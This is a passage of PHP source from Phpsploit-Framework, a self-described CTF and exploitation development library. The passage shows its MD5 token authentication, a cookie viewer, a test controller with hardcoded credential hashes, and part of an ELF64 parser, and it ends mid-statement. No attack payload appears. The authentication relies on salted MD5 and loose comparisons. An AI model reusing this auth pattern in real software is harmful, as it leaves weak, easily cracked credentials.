    public static function exist_token ()
    {
        if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key   = Class_Base_Auth::SHM_KEY;
            $_shmid = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( ! empty( $_shmid ) ) {
                $_share_memory_md5_token = Class_Base_Memory::read_share_memory ( $_shmid , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! empty( $_share_memory_md5_token ) ) {
                    $_share_memory_md5_token = Class_Base_Format::data_to_string ( $_share_memory_md5_token );
                    if ( ! empty( $_share_memory_md5_token ) ) {
                        return true;
                    }
                }
            }
        } else {
            return true;
        }

        return false;
    }

    public static function reset_token ( $password = null )
    {
        if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key           = Class_Base_Auth::SHM_KEY;
            $_security_code = Class_Base_Auth::SECURITY_CODE;
            $_shmid         = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
            if ( ! empty( $_shmid ) ) {
                $_password               = Class_Base_Auth::create_password ();
                $_md5_token              = md5 ( $_password . $_security_code );
                $_share_memory_md5_token = md5 ( $_md5_token . $_security_code );
                $_write_length           = Class_Base_Memory::write_share_memory ( $_shmid , $_share_memory_md5_token , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( empty( $_write_length ) ) {
                    Class_Base_Memory::delete_share_memory_by_key ( $_key , Class_Base_Memory::BLOCK_SIZE_32 );
                    throw new \Exception( "auth password reset is fail" , 0 );
                }
                return $_md5_token;
            }
        } else if ( ( is_string ( $password ) ) && ( strlen ( $password ) > 0 ) ) {
            $_md5_token = md5 ( $password . Class_Base_Auth::SECURITY_CODE );
            return $_md5_token;
        }
        return null;
    }

    public static function create_token ( $password = null )
    {
        if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key           = Class_Base_Auth::SHM_KEY;
            $_security_code = Class_Base_Auth::SECURITY_CODE;
            $_shmid         = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( empty( $_shmid ) ) {
                $_shmid = Class_Base_Memory::create_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 );
                if ( ! empty( $_shmid ) ) {
                    $_password               = Class_Base_Auth::create_password ();
                    $_md5_token              = md5 ( $_password . $_security_code );
                    $_share_memory_md5_token = md5 ( $_md5_token . $_security_code );
                    $_write_length           = Class_Base_Memory::write_share_memory ( $_shmid , $_share_memory_md5_token , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( empty( $_write_length ) ) {
                        Class_Base_Memory::delete_share_memory_by_key ( $_key , Class_Base_Memory::BLOCK_SIZE_32 );
                        throw new \Exception( "auth password init is fail" , 0 );
                    }
                    return $_md5_token;
                }
            }
        } else if ( ( is_string ( $password ) ) && ( strlen ( $password ) > 0 ) ) {
            $_md5_token = md5 ( $password . Class_Base_Auth::SECURITY_CODE );
            return $_md5_token;
        }
        return null;
    }

    public static function check_md5_token ( $md5_token )
    {
        if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key   = Class_Base_Auth::SHM_KEY;
            $_shmid = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( ! empty( $_shmid ) ) {
                $_share_memory_md5_token = Class_Base_Memory::read_share_memory ( $_shmid , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! empty( $_share_memory_md5_token ) ) {
                    $_share_memory_md5_token = Class_Base_Format::data_to_string ( $_share_memory_md5_token );
                    if ( ! empty( $_share_memory_md5_token ) ) {
                        if ( ( md5 ( $md5_token . Class_Base_Auth::SECURITY_CODE ) ) == $_share_memory_md5_token ) {
                            return true;
                        }
                    }
                }
            }
        } else {
            if ( ( md5 ( $md5_token . Class_Base_Auth::SECURITY_CODE ) ) == PRIVILEGE_USER_MODULE_PASSWORD ) {
                return true;
            }
        }
        return false;
    }

    public static function create_password ( $password = null )
    {
        if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key           = Class_Base_Auth::SHM_KEY;
            $_security_code = Class_Base_Auth::SECURITY_CODE;
            $_shmid         = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( empty( $_shmid ) ) {
                $_shmid = Class_Base_Memory::create_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 );
                if ( ! empty( $_shmid ) ) {
                    $_password               = Class_Base_Auth::create_password ();
                    $_md5_token              = md5 ( $_password . $_security_code );
                    $_share_memory_md5_token = md5 ( $_md5_token . $_security_code );
                    $_write_length           = Class_Base_Memory::write_share_memory ( $_shmid , $_share_memory_md5_token , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( empty( $_write_length ) ) {
                        Class_Base_Memory::delete_share_memory_by_key ( $_key , Class_Base_Memory::BLOCK_SIZE_32 );
                        throw new \Exception( "auth password init is fail" , 0 );
                    }
                    return $_password;
                }
            }
        } else if ( ( is_string ( $password ) ) && ( strlen ( $password ) > 0 ) ) {
            return $password;
        }
        return null;
    }

    public static function password_to_md5_token ( $password )
    {
        if ( ! is_string ( $password ) ) {
            return null;
        }
        $_md5_token = md5 ( $password . Class_Base_Auth::SECURITY_CODE );
        return $_md5_token;
    }

    public static function reset_password ( $password = null )
    {
        if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key           = Class_Base_Auth::SHM_KEY;
            $_security_code = Class_Base_Auth::SECURITY_CODE;
            $_shmid         = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
            if ( ! empty( $_shmid ) ) {
                $_token                  = Class_Base_Auth::create_password ();
                $_md5_token              = md5 ( $_token . $_security_code );
                $_share_memory_md5_token = md5 ( $_md5_token . $_security_code );
                $_write_length           = Class_Base_Memory::write_share_memory ( $_shmid , $_share_memory_md5_token , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( empty( $_write_length ) ) {
                    Class_Base_Memory::delete_share_memory_by_key ( $_key , Class_Base_Memory::BLOCK_SIZE_32 );
                    throw new \Exception( "auth password reset is fail" , 0 );
                }
                return $_token;
            }
        } else if ( ( is_string ( $password ) ) && ( strlen ( $password ) > 0 ) ) {
            return $password;
        }
        return null;
    }

    public static function check_privilege_user_and_password_for_clear ( $privilege_user , $privilege_password )
    {
        if ( ( ! is_string ( $privilege_user ) ) || ( strlen ( $privilege_user ) <= 0 ) ) {
            return false;
        }
        if ( ( ! is_string ( $privilege_password ) ) || ( strlen ( $privilege_password ) <= 0 ) ) {
            return false;
        }
        if ( md5 ( ( md5 ( ( $privilege_user . Class_Base_Auth::SECURITY_CODE ) ) . Class_Base_Auth::SECURITY_CODE ) ) == PRIVILEGE_USER_MODULE_USER ) {
            if ( md5 ( ( md5 ( ( $privilege_password . Class_Base_Auth::SECURITY_CODE ) ) . Class_Base_Auth::SECURITY_CODE ) ) == PRIVILEGE_USER_MODULE_PASSWORD ) {
                return true;
            }
        }
        return false;
    }

    public static function check_privilege_user_and_password ( $privilege_user , $privilege_password , &$user = null , &$password = null , &$md5_token = null )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_string ( $privilege_user ) ) || ( strlen ( $privilege_user ) <= 0 ) ) {
            return false;
        }
        if ( ( ! is_string ( $privilege_password ) ) || ( strlen ( $privilege_password ) <= 0 ) ) {
            return false;
        }
        if ( md5 ( ( md5 ( ( $privilege_user . Class_Base_Auth::SECURITY_CODE ) ) . Class_Base_Auth::SECURITY_CODE ) ) == PRIVILEGE_USER_MODULE_USER ) {
            if ( md5 ( ( md5 ( ( $privilege_password . Class_Base_Auth::SECURITY_CODE ) ) . Class_Base_Auth::SECURITY_CODE ) ) == PRIVILEGE_USER_MODULE_PASSWORD ) {
                if ( ( ! isset( $_SESSION ) ) || ( ! is_array ( $_SESSION ) ) ) {
                    $_SESSION = array ();
                }
                if ( ! Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ]      = $user = $privilege_user;
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ]  = $password = $privilege_password;
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] = $md5_token = md5 ( ( $privilege_password . Class_Base_Auth::SECURITY_CODE ) );
                    return true;
                } else {
                    if ( ! self::exist_token () ) {
                        $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ]      = $user = $privilege_user;
                        $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ]  = $password = self::create_password ( $privilege_password );
                        $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] = $md5_token = md5 ( ( $password . Class_Base_Auth::SECURITY_CODE ) );
                    }
                    return true;
                }
            }
        }
        return false;
    }

    public static function check_user_and_password ( $user , $password , &$md5_token = null )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ! is_string ( $user ) ) {
            return false;
        }
        if ( ! is_string ( $password ) ) {
            return false;
        }
        if ( Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
            $_key   = Class_Base_Auth::SHM_KEY;
            $_shmid = Class_Base_Memory::open_share_memory ( $_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
            if ( ! empty( $_shmid ) ) {
                $_share_memory_md5_token = Class_Base_Memory::read_share_memory ( $_shmid , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::BLOCK_SIZE_32 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! empty( $_share_memory_md5_token ) ) {
                    $_share_memory_md5_token = Class_Base_Format::data_to_string ( $_share_memory_md5_token );
                    if ( ! empty( $_share_memory_md5_token ) ) {
                        if ( md5 ( ( md5 ( ( $password . Class_Base_Auth::SECURITY_CODE ) ) . Class_Base_Auth::SECURITY_CODE ) ) == $_share_memory_md5_token ) {
                            if ( ( ! isset( $_SESSION ) ) || ( ! is_array ( $_SESSION ) ) ) {
                                $_SESSION = array ();
                            }
                            $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ]      = $user;
                            $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ]  = $password;
                            $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] = $md5_token = md5 ( ( $password . Class_Base_Auth::SECURITY_CODE ) );
                            return true;
                        }
                    }
                }
            }
        } else {
            return self::check_privilege_user_and_password ( $user , $password );
        }
        return false;
    }

    public static function create_privilege_encode_user ( $user )
    {
        if ( ( ! is_string ( $user ) ) || ( strlen ( $user ) <= 0 ) ) {
            return null;
        }
        $_encode_user = md5 ( md5 ( $user . Class_Base_Auth::SECURITY_CODE ) . Class_Base_Auth::SECURITY_CODE );
        return $_encode_user;
    }

    public static function create_privilege_encode_password ( $password )
    {
        if ( ( ! is_string ( $password ) ) || ( strlen ( $password ) <= 0 ) ) {
            return null;
        }
        $_encode_password = md5 ( md5 ( $password . Class_Base_Auth::SECURITY_CODE ) . Class_Base_Auth::SECURITY_CODE );
        return $_encode_password;
    }

    public static function create_security_code ()
    {
        $_security_code = Class_Base_Request::create_security_code ();
        return $_security_code;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-27
 * Time: 下午6:55
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Cookie extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Cookie_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function cookie_info ( $params = array () )
    {
        if ( is_cli () ) {
            global $_COOKIE;
            if ( ! is_array ( $_COOKIE ) ) {
                $_COOKIE = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( is_cli () ) {
            Class_Base_Response ::outputln (
                $_COOKIE
            );
        }
        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/cookie/cookie_info" , array () );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Display relevant information about PHP cookie environment variables</div>';
            $_form_top       .= '<div style="width:100%;word-break:break-all;margin-top:16px;padding-left:0;padding-right:0;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface mainly displays the external cookie variable content of the PHP language located on the server side.If you try to access this interface in a command-line environment, you may not be able to obtain valid information. Because in general, processes in the command line environment cannot obtain cookie environment information in the web environment (although we can achieve cookie environment information exchange between the web environment and the command line environment through special technical means. However, in order to reduce the software\'s inherent environmental dependencies and improve the software\'s compatibility and availability, the author of this software did not choose to do so).</div>';
            $_form           = array (
                "action"    => "/cookie/cookie_info" ,
                "inputs"    => array () ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "display" => false ,
                ) ,
                "reset"     => array (
                    "display" => false ,
                ) ,
            );
            foreach ( $_COOKIE as $key => $value ) {
                $_form[ "inputs" ][] = array (
                    "id"       => $key ,
                    "title"    => ( ( strlen ( $key ) > 12 ) ? ( substr ( $key , 0 , 12 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) : ( $key ) ) ,
                    "describe" => $key ,
                    "name"     => $key ,
                    "value"    => ( $value ) ,
                    "disabled" => "disabled" ,
                );
            }
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Cookie_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Test extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( PRIVILEGE_USER_MODULE_USER == "38305ac7e5f1b870f6e92aef5e281b2d" ) && ( PRIVILEGE_USER_MODULE_PASSWORD == "6f02faa1775d964e58b227e0ef3fa7fd" ) && ( DEVLOP == 1 ) && ( DEBUG == 1 ) && ( filter_var ( $_SERVER[ "SERVER_ADDR" ] , FILTER_FLAG_NO_PRIV_RANGE ) === false ) ) {
            Class_Base_Auth::clear ();
            Class_Controller_Memory::clear ();
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 上午9:54
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64 extends Class_Base_Elf
{
    const TYPE_ELF64_ADDR    = "ELF64_Addr";
    const TYPE_ELF64_OFF     = "ELF64_Off";
    const TYPE_ELF64_HALF    = "ELF64_Half";
    const TYPE_ELF64_WORD    = "ELF64_Word";
    const TYPE_ELF64_SWORD   = "ELF64_Sword";
    const TYPE_ELF64_XWORD   = "ELF64_Xword";
    const TYPE_ELF64_SXWORD  = "ELF64_Sxword";
    const TYPE_UNSIGNED_CHAR = "unsigned char";

    const SIZE_ELF64_ADDR    = 8;
    const SIZE_ELF64_OFF     = 8;
    const SIZE_ELF64_HALF    = 2;
    const SIZE_ELF64_WORD    = 4;
    const SIZE_ELF64_SWORD   = 4;
    const SIZE_ELF64_XWORD   = 8;
    const SIZE_ELF64_SXWORD  = 8;
    const SIZE_UNSIGNED_CHAR = 1;

    const ALIGNMENT_ELF64_ADDR    = 8;
    const ALIGNMENT_ELF64_OFF     = 8;
    const ALIGNMENT_ELF64_HALF    = 2;
    const ALIGNMENT_ELF64_WORD    = 4;
    const ALIGNMENT_ELF64_SWORD   = 4;
    const ALIGNMENT_ELF64_XWORD   = 8;
    const ALIGNMENT_ELF64_SXWORD  = 8;
    const ALIGNMENT_UNSIGNED_CHAR = 1;

    const PURPOSE_ELF64_ADDR    = "Unsigned program address";
    const PURPOSE_ELF64_OFF     = "Unsigned file offset";
    const PURPOSE_ELF64_HALF    = "Unsigned medium integer";
    const PURPOSE_ELF64_WORD    = "Unsigned integer";
    const PURPOSE_ELF64_SWORD   = "Signed integer";
    const PURPOSE_ELF64_XWORD   = "Unsigned long integer";
    const PURPOSE_ELF64_SXWORD  = "Signed long integer";
    const PURPOSE_UNSIGNED_CHAR = "Unsigned small integer";

    public static function get_file_header_offset ()
    {
        $_offset = ( Class_Base_Elf64_File_Header::get_file_header_offset () );
        return $_offset;
    }

    public static function get_file_header_size ()
    {
        $_file_header_size = ( Class_Base_Elf64_File_Header::get_file_header_size () );
        return $_file_header_size;
    }

    public static function get_program_header_table_offset ()
    {
        $_offset = ( self::get_file_header_offset () + Class_Base_Elf64_File_Header::get_file_header_size () );
        return $_offset;
    }

    public static function get_file_info ( $file_path )
    {
        if ( ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 0 ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) && ( Class_Base_File::get_file_size ( $file_path ) > ( Class_Base_Elf64_File_Header::get_file_header_size () ) ) ) {
            $_file_point = @fopen ( $file_path , "rb" );
            if ( ! empty( $_file_point ) ) {
                $_file_info           = array ();
                $_file_head_size      = Class_Base_Elf64_File_Header::get_file_header_size ();
                $_file_header_content = @fread ( $_file_point , $_file_head_size );
                if ( ! empty( $_file_header_content ) ) {
                    $_file_header_content_size = strlen ( $_file_header_content );
                    if ( $_file_header_content_size == $_file_header_content_size ) {
                        $_file_info[ "file_header" ]     = $_file_header_object = Class_Base_Elf64_File_Header::create_elf64_ehdr (
                            $file_path ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_ident_offset () , Class_Base_Elf64_File_Header::SIZE_E_IDENT ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_type_offset () , Class_Base_Elf64_File_Header::SIZE_E_TYPE ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_machine_offset () , Class_Base_Elf64_File_Header::SIZE_E_MACHINE ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_version_offset () , Class_Base_Elf64_File_Header::SIZE_E_VERSION ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_entry_offset () , Class_Base_Elf64_File_Header::SIZE_E_ENTRY ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_phoff_offset () , Class_Base_Elf64_File_Header::SIZE_E_PHOFF ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_shoff_offset () , Class_Base_Elf64_File_Header::SIZE_E_SHOFF ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_flags_offset () , Class_Base_Elf64_File_Header::SIZE_E_FLAGS ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_ehsize_offset () , Class_Base_Elf64_File_Header::SIZE_E_EHSIZE ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_phentsize_offset () , Class_Base_Elf64_File_Header::SIZE_E_PHENTSIZE ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_phnum_offset () , Class_Base_Elf64_File_Header::SIZE_E_PHNUM ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_shentsize_offset () , Class_Base_Elf64_File_Header::SIZE_E_SHENTSIZE ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_shnum_offset () , Class_Base_Elf64_File_Header::SIZE_E_SHNUM ) ,
                            substr ( $_file_header_content , Class_Base_Elf64_File_Header::get_e_shstrndx_offset () , Class_Base_Elf64_File_Header::SIZE_E_SHSTRNDX )
                        );
                        $_file_info[ "program_headers" ] = array ();
                        $_file_info[ "programs" ]        = array ();
                        $_program_head_count             = $_file_info[ "file_header" ]->get_program_header_count ();
                        $_program_head_size              = Class_Base_Elf64_Program_Header::get_Program_header_size ();
                        $_program_head_offset            = intval ( $_file_info[ "file_header" ]->get_program_header_offset () );
                        for ( $programs_index = 0 ; $programs_index < $_program_head_count ; $programs_index++ ) {
                            fseek ( $_file_point , $_program_head_offset , SEEK_SET );
                            $_program_head_content = @fread ( $_file_point , $_program_head_size );
                            if ( ! empty( $_program_head_content ) ) {
                                $_program_head_content_size = strlen ( $_program_head_content );
                                if ( $_program_head_size == $_program_head_content_size ) {
                                    $_file_info[ "program_headers" ][ $_program_head_offset ] = Class_Base_Elf64_Program_Header::create_elf64_phdr (
                                        $file_path ,
                                        substr ( $_program_head_content , Class_Base_Elf64_Program_Header::get_p_type_offset () , Class_Base_Elf64_Program_Header::SIZE_P_TYPE ) ,
                                        substr ( $_program_head_content , Class_Base_Elf64_Program_Header::get_p_flags_offset () , Class_Base_Elf64_Program_Header::SIZE_P_FLAGS ) ,
                                        substr ( $_program_head_content , Class_Base_Elf64_Program_Header::get_p_offset_offset () , Class_Base_Elf64_Program_Header::SIZE_P_OFFSET ) ,
                                        substr ( $_program_head_content , Class_Base_Elf64_Program_Header::get_p_vaddr_offset () , Class_Base_Elf64_Program_Header::SIZE_P_VADDR ) ,
                                        substr ( $_program_head_content , Class_Base_Elf64_Program_Header::get_p_paddr_offset () , Class_Base_Elf64_Program_Header::SIZE_P_PADDR ) ,
                                        substr ( $_program_head_content , Class_Base_Elf64_Program_Header::get_p_filesz_offset () , Class_Base_Elf64_Program_Header::SIZE_P_FILESZ ) ,
                                        substr ( $_program_head_content , Class_Base_Elf64_Program_Header::get_p_memsz_offset () , Class_Base_Elf64_Program_Header::SIZE_P_MEMSZ ) ,
                                        substr ( $_program_head_content , Class_Base_Elf64_Program_Header::get_p_align_offset () , Class_Base_Elf64_Program_Header::SIZE_P_ALIGN )
                                    );
                                    if ( intval ( $_file_info[ "program_headers" ][ $_program_head_offset ]->get_p_type () ) > 0 ) {
                                        $_program_info = Class_Base_Elf64_Program::get_program_content ( $file_path , $_file_info[ "program_headers" ][ $_program_head_offset ]->get_p_type () , $_file_info[ "program_headers" ][ $_program_head_offset ]->get_p_offset () , $_file_info[ "program_headers" ][ $_program_head_offset ]->get_p_filesz () );
                                        if ( $_program_info !== false ) {
                                            $_file_info[ "programs" ][ $_file_info[ "program_headers" ][ $_program_head_offset ]->get_p_offset () ] = $_program_info;
                                        }
                                    }
                                    //Class_Base_Response::outputln ( array ($_file_info[ "program_headers" ][ $_program_head_offset ]->get_format_program_header() , $_file_info[ "programs" ][ $_file_info[ "program_headers" ][ $_program_head_offset ]->get_p_offset () ] ) );
                                }
                            }
                            $_program_head_offset += $_program_head_size;
                        }

                        $_file_info[ "section_shstrtab" ] = $_section_shstrtab = self::create_section_shstrtab ( $file_path , $_file_header_object );
                        $_file_info[ "section_syms" ]     = $_section_syms = self::create_section_syms ( $file_path , $_file_header_object );
                        $_file_info[ "section_headers" ]  = array ();
                        $_file_info[ "sections" ]         = array ();
                        $_section_header_count            = $_file_info[ "file_header" ]->get_section_header_count ();
                        $_section_header_size             = Class_Base_Elf64_Section_Header::get_section_header_size ();
                        $_section_header_offset           = intval ( $_file_info[ "file_header" ]->get_section_header_offset () );
                        for ( $section_index = 0 ; $section_index < $_section_header_count ; $section_index++ ) {
                            fseek ( $_file_point , $_section_header_offset , SEEK_SET );
                            $_section_header_content = @fread ( $_file_point , $_section_header_size );
                            if ( ! empty( $_section_header_content ) ) {
                                $_section_header_content_size = strlen ( $_section_header_content );
                                if ( $_section_header_size == $_section_header_content_size ) {
                                    $_file_info[ "section_headers" ][ $_section_header_offset ] = $_section_header_object = Class_Base_Elf64_Section_Header::create_elf64_shdr (
                                        $file_path ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_name_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_NAME ) ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_type_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_TYPE ) ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_flags_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_FLAGS ) ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_addr_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_ADDR ) ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_offset_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_OFFSET ) ,
                                        substr ( $_section_header_content , Class_Base_Elf64_Section_Header::get_sh_size_offset () , Class_Base_Elf64_Section_Header::SIZE_SH_SIZE ) ,
